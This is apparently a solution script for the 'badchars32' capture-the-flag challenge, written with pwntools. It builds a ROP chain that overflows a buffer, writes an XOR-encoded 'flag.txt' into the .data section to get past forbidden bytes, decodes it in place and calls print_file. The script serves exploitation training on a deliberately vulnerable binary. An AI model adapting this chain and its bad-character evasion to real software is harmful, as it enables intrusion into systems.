from pwn import *
import pwn

BINARY = './badchars32'

context.os = "linux"
context.arch = "i386"
context.binary = BINARY
# address 
pwnme = 0x080483b0
data_section =  0x0804a018 # .data section
print_file = 0x080483d0 #print_file(data)
# gadget
pop_esi_edi_ebp = 0x080485b9 # pop esi; pop edi; pop ebp; ret;
mov_ptr_edi_esi = 0x0804854f # mov dword ptr [edi], esi ; ret
xor_ebp_bl = 0x08048547 # xor byte ptr [ebp], bl ; ret
pop_ebx = 0x0804839d #pop ebx ; ret
pop_ebp = 0x080485bb # pop ebp ; ret

p = process(BINARY)
def xor_data(data,key):
    return bytes([data[i] ^ key for i in range(len(data))])

def output(data):
    open('./input', 'wb').write(data)

def xor_loop_rop():
    rop = b''
    for i in range(len("flag.txt")):
        rop += p32(pop_ebp)
        rop += p32(data_section+i)
        rop += p32(pop_ebx)
        rop += p32(0x00000002)
        rop += p32(xor_ebp_bl)
    return rop

def payload():
    rop = b'A' * 44
    rop += p32(pop_esi_edi_ebp)
    rop += xor_data(b'flag',2)
    rop += p32(data_section)
    rop += b'BBBB'
    rop += p32(mov_ptr_edi_esi)
    rop += p32(pop_esi_edi_ebp)
    rop += xor_data(b'.txt',2)
    rop += p32(data_section+4)
    rop += b'BBBB'
    rop += p32(mov_ptr_edi_esi)
    
    rop += xor_loop_rop()

    rop += p32(print_file)
    rop += b'BBBB'
    rop += p32(data_section)
    return rop


rop = payload()
p.sendline(rop)
flag = p.recvall()
print(flag)

output(rop)